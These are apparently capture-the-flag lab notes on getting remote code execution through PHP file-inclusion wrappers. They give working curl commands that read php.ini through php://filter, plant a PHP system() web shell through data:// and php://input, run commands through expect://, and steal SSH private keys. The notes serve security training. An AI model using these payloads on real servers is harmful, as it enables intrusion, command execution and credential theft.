# Remote Code Execution

## PHP Wrappers

One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session.

First we can check the `.ssh` directory in each user's home directory to grab their private key (`id_rsa`) and use it to SSH into the system.

***

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code if the (`allow_url_include`) setting is enabled in the PHP configurations

PHP conf Apache: `/etc/php/X.Y/apache2/php.ini`

PHP conf Nginx: `/etc/php/X.Y/fpm/php.ini` where `X.Y` is your install PHP version

```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

`grep` for `allow_url_include ->`

```shell-session
ElFelixi0@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Now to gain RCE ->

```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Then with the base64 value we call the data wrapper:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

Or in curl:

```shell-session
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

***

the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code but the difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data.

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

***

the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams

it needs to be manually installed and enabled on the back-end server so this time we need to `grep` for `expect`

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

And if it's on , we can exploit this like this:

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

_**Try to gain RCE using one of the PHP wrappers and read the flag at /**_

```
curl "http://94.237.59.63:52729/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

<figure><img src="../../../.gitbook/assets/image (1381).png" alt=""><figcaption></figcaption></figure>

```
<SNIP>%3D&cmd=ls%20-al"
```

<figure><img src="../../../.gitbook/assets/image (1382).png" alt=""><figcaption></figcaption></figure>
